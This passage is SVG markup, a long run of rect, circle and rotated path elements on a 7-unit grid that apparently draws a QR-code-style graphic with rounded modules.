                                                            <path d="M 108 192v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,111.5,195.5)"></path>
                                                            <rect x="108" y="199" width="7" height="7" transform="rotate(0,111.5,202.5)"></rect>
                                                            <rect x="108" y="206" width="7" height="7" transform="rotate(0,111.5,209.5)"></rect>
                                                            <path d="M 108 213v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,111.5,216.5)"></path>
                                                            <rect x="108" y="227" width="7" height="7" transform="rotate(0,111.5,230.5)"></rect>
                                                            <rect x="108" y="234" width="7" height="7" transform="rotate(0,111.5,237.5)"></rect>
                                                            <rect x="108" y="241" width="7" height="7" transform="rotate(0,111.5,244.5)"></rect>
                                                            <rect x="108" y="248" width="7" height="7" transform="rotate(0,111.5,251.5)"></rect>
                                                            <rect x="108" y="255" width="7" height="7" transform="rotate(0,111.5,258.5)"></rect>
                                                            <rect x="108" y="262" width="7" height="7" transform="rotate(0,111.5,265.5)"></rect>
                                                            <rect x="115" y="10" width="7" height="7" transform="rotate(0,118.5,13.5)"></rect>
                                                            <rect x="115" y="24" width="7" height="7" transform="rotate(0,118.5,27.5)"></rect>
                                                            <rect x="115" y="31" width="7" height="7" transform="rotate(0,118.5,34.5)"></rect>
                                                            <rect x="115" y="38" width="7" height="7" transform="rotate(0,118.5,41.5)"></rect>
                                                            <path d="M 115 45v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,118.5,48.5)"></path>
                                                            <circle cx="118.5" cy="69.5" r="3.5" transform="rotate(0,118.5,69.5)"></circle>
                                                            <path d="M 115 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,118.5,90.5)"></path>
                                                            <path d="M 115 94v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,118.5,97.5)"></path>
                                                            <circle cx="118.5" cy="181.5" r="3.5" transform="rotate(0,118.5,181.5)"></circle>
                                                            <rect x="115" y="192" width="7" height="7" transform="rotate(0,118.5,195.5)"></rect>
                                                            <rect x="115" y="199" width="7" height="7" transform="rotate(0,118.5,202.5)"></rect>
                                                            <rect x="115" y="206" width="7" height="7" transform="rotate(0,118.5,209.5)"></rect>
                                                            <rect x="115" y="213" width="7" height="7" transform="rotate(0,118.5,216.5)"></rect>
                                                            <path d="M 115 227v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,118.5,230.5)"></path>
                                                            <path d="M 115 234v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,118.5,237.5)"></path>
                                                            <rect x="115" y="248" width="7" height="7" transform="rotate(0,118.5,251.5)"></rect>
                                                            <rect x="115" y="262" width="7" height="7" transform="rotate(0,118.5,265.5)"></rect>
                                                            <rect x="122" y="10" width="7" height="7" transform="rotate(0,125.5,13.5)"></rect>
                                                            <rect x="122" y="17" width="7" height="7" transform="rotate(0,125.5,20.5)"></rect>
                                                            <rect x="122" y="24" width="7" height="7" transform="rotate(0,125.5,27.5)"></rect>
                                                            <rect x="122" y="31" width="7" height="7" transform="rotate(0,125.5,34.5)"></rect>
                                                            <path d="M 122 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,125.5,41.5)"></path>
                                                            <path d="M 122 52v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,125.5,55.5)"></path>
                                                            <path d="M 122 59v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,125.5,62.5)"></path>
                                                            <rect x="122" y="94" width="7" height="7" transform="rotate(0,125.5,97.5)"></rect>
                                                            <circle cx="125.5" cy="174.5" r="3.5" transform="rotate(0,125.5,174.5)"></circle>
                                                            <path d="M 122 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,125.5,188.5)"></path>
                                                            <path d="M 122 192v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,125.5,195.5)"></path>
                                                            <rect x="122" y="206" width="7" height="7" transform="rotate(0,125.5,209.5)"></rect>
                                                            <rect x="122" y="213" width="7" height="7" transform="rotate(0,125.5,216.5)"></rect>
                                                            <path d="M 122 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,125.5,223.5)"></path>
                                                            <path d="M 122 241v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,125.5,244.5)"></path>
                                                            <rect x="122" y="248" width="7" height="7" transform="rotate(0,125.5,251.5)"></rect>
                                                            <rect x="122" y="255" width="7" height="7" transform="rotate(0,125.5,258.5)"></rect>
                                                            <path d="M 122 262v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,125.5,265.5)"></path>
                                                            <rect x="129" y="10" width="7" height="7" transform="rotate(0,132.5,13.5)"></rect>
                                                            <rect x="129" y="17" width="7" height="7" transform="rotate(0,132.5,20.5)"></rect>
                                                            <path d="M 129 45v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,132.5,48.5)"></path>
                                                            <path d="M 129 59v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,132.5,62.5)"></path>
                                                            <circle cx="132.5" cy="83.5" r="3.5" transform="rotate(0,132.5,83.5)"></circle>
                                                            <path d="M 129 94v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,132.5,97.5)"></path>
                                                            <path d="M 129 101v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,132.5,104.5)"></path>
                                                            <circle cx="132.5" cy="181.5" r="3.5" transform="rotate(0,132.5,181.5)"></circle>
                                                            <path d="M 129 199v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,132.5,202.5)"></path>
                                                            <rect x="129" y="206" width="7" height="7" transform="rotate(0,132.5,209.5)"></rect>
                                                            <path d="M 129 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,132.5,223.5)"></path>
                                                            <path d="M 129 227v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,132.5,230.5)"></path>
                                                            <path d="M 129 241v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,132.5,244.5)"></path>
                                                            <rect x="129" y="248" width="7" height="7" transform="rotate(0,132.5,251.5)"></rect>
                                                            <rect x="136" y="10" width="7" height="7" transform="rotate(0,139.5,13.5)"></rect>
                                                            <rect x="136" y="17" width="7" height="7" transform="rotate(0,139.5,20.5)"></rect>
                                                            <rect x="136" y="24" width="7" height="7" transform="rotate(0,139.5,27.5)"></rect>
                                                            <rect x="136" y="31" width="7" height="7" transform="rotate(0,139.5,34.5)"></rect>
                                                            <rect x="136" y="38" width="7" height="7" transform="rotate(0,139.5,41.5)"></rect>
                                                            <rect x="136" y="45" width="7" height="7" transform="rotate(0,139.5,48.5)"></rect>
                                                            <path d="M 136 52v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,139.5,55.5)"></path>
                                                            <circle cx="139.5" cy="76.5" r="3.5" transform="rotate(0,139.5,76.5)"></circle>
                                                            <path d="M 136 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,139.5,90.5)"></path>
                                                            <path d="M 136 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,139.5,104.5)"></path>
                                                            <circle cx="139.5" cy="174.5" r="3.5" transform="rotate(0,139.5,174.5)"></circle>
                                                            <path d="M 136 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,139.5,188.5)"></path>
                                                            <rect x="136" y="192" width="7" height="7" transform="rotate(0,139.5,195.5)"></rect>
                                                            <rect x="136" y="199" width="7" height="7" transform="rotate(0,139.5,202.5)"></rect>
                                                            <rect x="136" y="206" width="7" height="7" transform="rotate(0,139.5,209.5)"></rect>
                                                            <path d="M 136 227v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,139.5,230.5)"></path>
                                                            <path d="M 136 234v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,139.5,237.5)"></path>
                                                            <path d="M 136 248v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,139.5,251.5)"></path>
                                                            <path d="M 136 262v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,139.5,265.5)"></path>
                                                            <path d="M 143 10v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,146.5,13.5)"></path>
                                                            <rect x="143" y="87" width="7" height="7" transform="rotate(0,146.5,90.5)"></rect>
                                                            <path d="M 143 94v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,146.5,97.5)"></path>
                                                            <circle cx="146.5" cy="181.5" r="3.5" transform="rotate(0,146.5,181.5)"></circle>
                                                            <rect x="143" y="192" width="7" height="7" transform="rotate(0,146.5,195.5)"></rect>
                                                            <rect x="143" y="199" width="7" height="7" transform="rotate(0,146.5,202.5)"></rect>
                                                            <path d="M 143 206v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,146.5,209.5)"></path>
                                                            <rect x="143" y="234" width="7" height="7" transform="rotate(0,146.5,237.5)"></rect>
                                                            <rect x="143" y="262" width="7" height="7" transform="rotate(0,146.5,265.5)"></rect>
                                                            <path d="M 150 24v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,153.5,27.5)"></path>
                                                            <path d="M 150 45v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,153.5,48.5)"></path>
                                                            <rect x="150" y="52" width="7" height="7" transform="rotate(0,153.5,55.5)"></rect>
                                                            <rect x="150" y="59" width="7" height="7" transform="rotate(0,153.5,62.5)"></rect>
                                                            <path d="M 150 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,153.5,69.5)"></path>
                                                            <path d="M 150 80v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,153.5,83.5)"></path>
                                                            <rect x="150" y="87" width="7" height="7" transform="rotate(0,153.5,90.5)"></rect>
                                                            <rect x="150" y="94" width="7" height="7" transform="rotate(0,153.5,97.5)"></rect>
                                                            <path d="M 150 101v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,153.5,104.5)"></path>
                                                            <path d="M 150 192v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,153.5,195.5)"></path>
                                                            <rect x="150" y="199" width="7" height="7" transform="rotate(0,153.5,202.5)"></rect>
                                                            <circle cx="153.5" cy="223.5" r="3.5" transform="rotate(0,153.5,223.5)"></circle>
                                                            <rect x="150" y="234" width="7" height="7" transform="rotate(0,153.5,237.5)"></rect>
                                                            <path d="M 150 248v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,153.5,251.5)"></path>
                                                            <rect x="150" y="255" width="7" height="7" transform="rotate(0,153.5,258.5)"></rect>
                                                            <rect x="150" y="262" width="7" height="7" transform="rotate(0,153.5,265.5)"></rect>
                                                            <path d="M 157 17v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,160.5,20.5)"></path>
                                                            <rect x="157" y="24" width="7" height="7" transform="rotate(0,160.5,27.5)"></rect>
                                                            <path d="M 157 31v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,160.5,34.5)"></path>
                                                            <rect x="157" y="45" width="7" height="7" transform="rotate(0,160.5,48.5)"></rect>
                                                            <path d="M 157 73v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,160.5,76.5)"></path>
                                                            <path d="M 157 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,160.5,104.5)"></path>
                                                            <circle cx="160.5" cy="174.5" r="3.5" transform="rotate(0,160.5,174.5)"></circle>
                                                            <path d="M 157 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,160.5,188.5)"></path>
                                                            <rect x="157" y="199" width="7" height="7" transform="rotate(0,160.5,202.5)"></rect>
                                                            <path d="M 157 213v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,160.5,216.5)"></path>
                                                            <path d="M 157 227v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,160.5,230.5)"></path>
                                                            <rect x="157" y="234" width="7" height="7" transform="rotate(0,160.5,237.5)"></rect>
                                                            <path d="M 157 241v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,160.5,244.5)"></path>
                                                            <rect x="157" y="262" width="7" height="7" transform="rotate(0,160.5,265.5)"></rect>
                                                            <path d="M 164 31v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,167.5,34.5)"></path>
                                                            <rect x="164" y="45" width="7" height="7" transform="rotate(0,167.5,48.5)"></rect>
                                                            <rect x="164" y="52" width="7" height="7" transform="rotate(0,167.5,55.5)"></rect>
                                                            <rect x="164" y="59" width="7" height="7" transform="rotate(0,167.5,62.5)"></rect>
                                                            <rect x="164" y="66" width="7" height="7" transform="rotate(0,167.5,69.5)"></rect>
                                                            <rect x="164" y="73" width="7" height="7" transform="rotate(0,167.5,76.5)"></rect>
                                                            <path d="M 164 80v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,167.5,83.5)"></path>
                                                            <circle cx="167.5" cy="97.5" r="3.5" transform="rotate(0,167.5,97.5)"></circle>
                                                            <path d="M 164 178v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,167.5,181.5)"></path>
                                                            <path d="M 164 185v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,167.5,188.5)"></path>
                                                            <rect x="164" y="199" width="7" height="7" transform="rotate(0,167.5,202.5)"></rect>
                                                            <rect x="164" y="206" width="7" height="7" transform="rotate(0,167.5,209.5)"></rect>
                                                            <rect x="164" y="213" width="7" height="7" transform="rotate(0,167.5,216.5)"></rect>
                                                            <rect x="164" y="220" width="7" height="7" transform="rotate(0,167.5,223.5)"></rect>
                                                            <rect x="164" y="227" width="7" height="7" transform="rotate(0,167.5,230.5)"></rect>
                                                            <rect x="164" y="234" width="7" height="7" transform="rotate(0,167.5,237.5)"></rect>
                                                            <path d="M 164 248v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,167.5,251.5)"></path>
                                                            <rect x="164" y="255" width="7" height="7" transform="rotate(0,167.5,258.5)"></rect>
                                                            <rect x="164" y="262" width="7" height="7" transform="rotate(0,167.5,265.5)"></rect>
                                                            <path d="M 171 17v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,174.5,20.5)"></path>
                                                            <path d="M 171 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,174.5,41.5)"></path>
                                                            <rect x="171" y="45" width="7" height="7" transform="rotate(0,174.5,48.5)"></rect>
                                                            <path d="M 171 59v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,174.5,62.5)"></path>
                                                            <path d="M 171 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,174.5,90.5)"></path>
                                                            <circle cx="174.5" cy="146.5" r="3.5" transform="rotate(0,174.5,146.5)"></circle>
                                                            <path d="M 171 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,174.5,160.5)"></path>
                                                            <path d="M 171 171v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,174.5,174.5)"></path>
                                                            <rect x="171" y="178" width="7" height="7" transform="rotate(0,174.5,181.5)"></rect>
                                                            <path d="M 171 199v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,174.5,202.5)"></path>
                                                            <rect x="171" y="206" width="7" height="7" transform="rotate(0,174.5,209.5)"></rect>
                                                            <path d="M 171 213v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,174.5,216.5)"></path>
                                                            <rect x="171" y="227" width="7" height="7" transform="rotate(0,174.5,230.5)"></rect>
                                                            <rect x="171" y="234" width="7" height="7" transform="rotate(0,174.5,237.5)"></rect>
                                                            <path d="M 171 255v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,174.5,258.5)"></path>
                                                            <path d="M 171 262v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,174.5,265.5)"></path>
                                                            <path d="M 178 10v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,181.5,13.5)"></path>
                                                            <rect x="178" y="17" width="7" height="7" transform="rotate(0,181.5,20.5)"></rect>
                                                            <rect x="178" y="24" width="7" height="7" transform="rotate(0,181.5,27.5)"></rect>
                                                            <rect x="178" y="31" width="7" height="7" transform="rotate(0,181.5,34.5)"></rect>
                                                            <rect x="178" y="38" width="7" height="7" transform="rotate(0,181.5,41.5)"></rect>
                                                            <rect x="178" y="45" width="7" height="7" transform="rotate(0,181.5,48.5)"></rect>
                                                            <path d="M 178 52v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,181.5,55.5)"></path>
                                                            <path d="M 178 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,181.5,69.5)"></path>
                                                            <path d="M 178 80v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,181.5,83.5)"></path>
                                                            <rect x="178" y="87" width="7" height="7" transform="rotate(0,181.5,90.5)"></rect>
                                                            <path d="M 178 94v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,181.5,97.5)"></path>
                                                            <path d="M 178 115v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,181.5,118.5)"></path>
                                                            <rect x="178" y="122" width="7" height="7" transform="rotate(0,181.5,125.5)"></rect>
                                                            <rect x="178" y="129" width="7" height="7" transform="rotate(0,181.5,132.5)"></rect>
                                                            <path d="M 178 136v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,181.5,139.5)"></path>
                                                            <path d="M 178 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,181.5,160.5)"></path>
                                                            <path d="M 178 171v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,181.5,174.5)"></path>
                                                            <path d="M 178 178v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,181.5,181.5)"></path>
                                                            <rect x="178" y="206" width="7" height="7" transform="rotate(0,181.5,209.5)"></rect>
                                                            <path d="M 178 220v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,181.5,223.5)"></path>
                                                            <rect x="178" y="227" width="7" height="7" transform="rotate(0,181.5,230.5)"></rect>
                                                            <rect x="178" y="234" width="7" height="7" transform="rotate(0,181.5,237.5)"></rect>
                                                            <path d="M 178 241v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,181.5,244.5)"></path>
                                                            <rect x="185" y="10" width="7" height="7" transform="rotate(0,188.5,13.5)"></rect>
                                                            <path d="M 185 17v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,188.5,20.5)"></path>
                                                            <path d="M 185 45v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,188.5,48.5)"></path>
                                                            <rect x="185" y="66" width="7" height="7" transform="rotate(0,188.5,69.5)"></rect>
                                                            <path d="M 185 80v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,188.5,83.5)"></path>
                                                            <path d="M 185 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,188.5,104.5)"></path>
                                                            <path d="M 185 108v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,188.5,111.5)"></path>
                                                            <path d="M 185 122v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,188.5,125.5)"></path>
                                                            <rect x="185" y="129" width="7" height="7" transform="rotate(0,188.5,132.5)"></rect>
                                                            <circle cx="188.5" cy="195.5" r="3.5" transform="rotate(0,188.5,195.5)"></circle>
                                                            <path d="M 185 206v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,188.5,209.5)"></path>
                                                            <path d="M 185 227v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,188.5,230.5)"></path>
                                                            <path d="M 185 255v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,188.5,258.5)"></path>
                                                            <rect x="192" y="10" width="7" height="7" transform="rotate(0,195.5,13.5)"></rect>
                                                            <path d="M 192 24v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,195.5,27.5)"></path>
                                                            <path d="M 192 31v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,195.5,34.5)"></path>
                                                            <circle cx="195.5" cy="55.5" r="3.5" transform="rotate(0,195.5,55.5)"></circle>
                                                            <rect x="192" y="66" width="7" height="7" transform="rotate(0,195.5,69.5)"></rect>
                                                            <circle cx="195.5" cy="97.5" r="3.5" transform="rotate(0,195.5,97.5)"></circle>
                                                            <path d="M 192 129v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,195.5,132.5)"></path>
                                                            <path d="M 192 136v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,195.5,139.5)"></path>
                                                            <path d="M 192 150v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,195.5,153.5)"></path>
                                                            <path d="M 192 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,195.5,160.5)"></path>
                                                            <path d="M 192 171v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,195.5,174.5)"></path>
                                                            <path d="M 192 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,195.5,181.5)"></path>
                                                            <path d="M 192 199v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,195.5,202.5)"></path>
                                                            <path d="M 192 213v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,195.5,216.5)"></path>
                                                            <path d="M 192 234v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,195.5,237.5)"></path>
                                                            <rect x="192" y="241" width="7" height="7" transform="rotate(0,195.5,244.5)"></rect>
                                                            <rect x="192" y="248" width="7" height="7" transform="rotate(0,195.5,251.5)"></rect>
                                                            <rect x="192" y="255" width="7" height="7" transform="rotate(0,195.5,258.5)"></rect>
                                                            <path d="M 192 262v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,195.5,265.5)"></path>
                                                            <rect x="199" y="10" width="7" height="7" transform="rotate(0,202.5,13.5)"></rect>
                                                            <path d="M 199 24v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,202.5,27.5)"></path>
                                                            <rect x="199" y="31" width="7" height="7" transform="rotate(0,202.5,34.5)"></rect>
                                                            <path d="M 199 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,202.5,41.5)"></path>
                                                            <path d="M 199 59v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,202.5,62.5)"></path>
                                                            <path d="M 199 66v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,202.5,69.5)"></path>
                                                            <path d="M 199 80v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,202.5,83.5)"></path>
                                                            <path d="M 199 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,202.5,104.5)"></path>
                                                            <circle cx="202.5" cy="118.5" r="3.5" transform="rotate(0,202.5,118.5)"></circle>
                                                            <path d="M 199 136v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,202.5,139.5)"></path>
                                                            <rect x="199" y="150" width="7" height="7" transform="rotate(0,202.5,153.5)"></rect>
                                                            <rect x="199" y="171" width="7" height="7" transform="rotate(0,202.5,174.5)"></rect>
                                                            <rect x="199" y="199" width="7" height="7" transform="rotate(0,202.5,202.5)"></rect>
                                                            <rect x="199" y="213" width="7" height="7" transform="rotate(0,202.5,216.5)"></rect>
                                                            <path d="M 199 227v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,202.5,230.5)"></path>
                                                            <rect x="199" y="234" width="7" height="7" transform="rotate(0,202.5,237.5)"></rect>
                                                            <rect x="199" y="248" width="7" height="7" transform="rotate(0,202.5,251.5)"></rect>
                                                            <rect x="199" y="255" width="7" height="7" transform="rotate(0,202.5,258.5)"></rect>
                                                            <path d="M 206 10v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,209.5,13.5)"></path>
                                                            <path d="M 206 38v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,209.5,41.5)"></path>
                                                            <circle cx="209.5" cy="55.5" r="3.5" transform="rotate(0,209.5,55.5)"></circle>
                                                            <path d="M 206 80v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,209.5,83.5)"></path>
                                                            <rect x="206" y="101" width="7" height="7" transform="rotate(0,209.5,104.5)"></rect>
                                                            <path d="M 206 122v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,209.5,125.5)"></path>
                                                            <path d="M 206 129v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,209.5,132.5)"></path>
                                                            <rect x="206" y="150" width="7" height="7" transform="rotate(0,209.5,153.5)"></rect>
                                                            <path d="M 206 164v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,209.5,167.5)"></path>
                                                            <rect x="206" y="171" width="7" height="7" transform="rotate(0,209.5,174.5)"></rect>
                                                            <path d="M 206 192v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,209.5,195.5)"></path>
                                                            <rect x="206" y="199" width="7" height="7" transform="rotate(0,209.5,202.5)"></rect>
                                                            <rect x="206" y="206" width="7" height="7" transform="rotate(0,209.5,209.5)"></rect>
                                                            <rect x="206" y="213" width="7" height="7" transform="rotate(0,209.5,216.5)"></rect>
                                                            <rect x="206" y="220" width="7" height="7" transform="rotate(0,209.5,223.5)"></rect>
                                                            <rect x="206" y="227" width="7" height="7" transform="rotate(0,209.5,230.5)"></rect>
                                                            <rect x="206" y="234" width="7" height="7" transform="rotate(0,209.5,237.5)"></rect>
                                                            <rect x="206" y="248" width="7" height="7" transform="rotate(0,209.5,251.5)"></rect>
                                                            <path d="M 206 255v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,209.5,258.5)"></path>
                                                            <path d="M 213 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,216.5,69.5)"></path>
                                                            <path d="M 213 73v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,216.5,76.5)"></path>
                                                            <path d="M 213 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,216.5,90.5)"></path>
                                                            <rect x="213" y="101" width="7" height="7" transform="rotate(0,216.5,104.5)"></rect>
                                                            <path d="M 213 115v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,216.5,118.5)"></path>
                                                            <rect x="213" y="122" width="7" height="7" transform="rotate(0,216.5,125.5)"></rect>
                                                            <rect x="213" y="129" width="7" height="7" transform="rotate(0,216.5,132.5)"></rect>
                                                            <rect x="213" y="136" width="7" height="7" transform="rotate(0,216.5,139.5)"></rect>
                                                            <rect x="213" y="143" width="7" height="7" transform="rotate(0,216.5,146.5)"></rect>
                                                            <path d="M 213 150v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,216.5,153.5)"></path>
                                                            <rect x="213" y="164" width="7" height="7" transform="rotate(0,216.5,167.5)"></rect>
                                                            <rect x="213" y="171" width="7" height="7" transform="rotate(0,216.5,174.5)"></rect>
                                                            <path d="M 213 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,216.5,188.5)"></path>
                                                            <rect x="213" y="206" width="7" height="7" transform="rotate(0,216.5,209.5)"></rect>
